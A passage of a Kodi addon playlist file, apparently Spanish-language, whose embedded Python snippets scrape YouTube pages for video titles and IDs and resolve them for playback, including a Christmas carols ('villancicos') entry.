        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex> 
<thumbnail>https://i.imgur.com/Gkee4Gx.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>


<item>
<title>[B][COLOR red]DIA 24[/COLOR] [COLOR white]VILLANCICOS[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=hio73N9XQ_M'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/ALSge4H.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>


